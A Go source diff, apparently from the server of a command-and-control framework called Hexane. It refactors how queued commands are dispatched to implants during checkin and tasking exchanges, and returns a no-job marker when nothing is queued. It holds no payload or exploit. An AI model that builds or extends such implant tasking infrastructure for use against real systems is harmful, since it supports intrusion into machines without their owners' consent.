@@ -5,7 +5,6 @@ import (
 	"strings"
 )
 
-// todo: implement command front-end and back-end
 // todo: implement implant multitasking
 
 var (
@@ -16,28 +15,47 @@ var (
 	}
 )
 
-func (h *HexaneConfig) DispatchCommand(stream *Stream) {
+func (h *HexaneConfig) DispatchCommand() (*Stream, error) {
 	var (
-		err error
-		cmd []byte
+		err    error
+		cmd    []byte
+		stream *Stream
 	)
 
-	if h.CommandChan != nil {
-		for blob := range h.CommandChan {
-			if cmd, err = h.ProcessCommand(blob); err != nil {
-				WrapMessage("ERR", err.Error())
-			}
+	if stream = h.CreateStreamWithHeaders(TypeTasking); stream == nil {
+		return nil, fmt.Errorf("stream returned nil")
+	}
 
-			stream.PackBytes(cmd)
-			WrapMessage("DBG", DbgPrintBytes(fmt.Sprintf("command sent to %d: ", h.PeerId), stream.Buffer))
+	if h.CommandChan == nil {
+		return nil, fmt.Errorf("command channel is nil")
+	}
+
+	select {
+	case blob := <-h.CommandChan:
+
+		WrapMessage("DBG", fmt.Sprintf("%d processing command: %s, task id: %d", h.PeerId, blob, h.CurrentTaskId))
+
+		if cmd, err = h.ProcessCommand(blob); err != nil {
+			return nil, err
 		}
-	} else {
-		WrapMessage("ERR", "command channel is nil")
+
+		stream.PackBytes(cmd)
+		return stream, nil
+
+	default:
+
+		WrapMessage("DBG", fmt.Sprintf("%d : CommandNoJob", h.PeerId))
+
+		stream.PackDword(CommandNoJob)
+		return stream, nil
 	}
 }
 
 func (h *HexaneConfig) ProcessParser(parser *Parser) ([]byte, error) {
-	var stream *Stream
+	var (
+		stream *Stream
+		err    error
+	)
 
 	switch parser.MsgType {
 	case TypeCheckin:
@@ -54,24 +72,19 @@ func (h *HexaneConfig) ProcessParser(parser *Parser) ([]byte, error) {
 
 	case TypeResponse:
 
-		h.WriteChan.ParseTable(parser)
 		WrapMessage("DBG", fmt.Sprintf("response from: %d", parser.PeerId))
 
-		if stream = h.CreateStreamWithHeaders(TypeTasking); stream == nil {
-			return nil, fmt.Errorf("stream returned nil")
+		h.WriteChan.ParseTable(parser)
+		if stream, err = h.DispatchCommand(); err != nil {
+			return nil, err
 		}
-
-		h.DispatchCommand(stream)
 
 	case TypeTasking:
 
 		WrapMessage("DBG", fmt.Sprintf("task request from: %d", parser.PeerId))
-
-		if stream = h.CreateStreamWithHeaders(TypeTasking); stream == nil {
-			return nil, fmt.Errorf("stream returned nil")
+		if stream, err = h.DispatchCommand(); err != nil {
+			return nil, err
 		}
-
-		h.DispatchCommand(stream)
 
 	default:
 		return nil, fmt.Errorf("unknown msg type: %v", parser.MsgType)
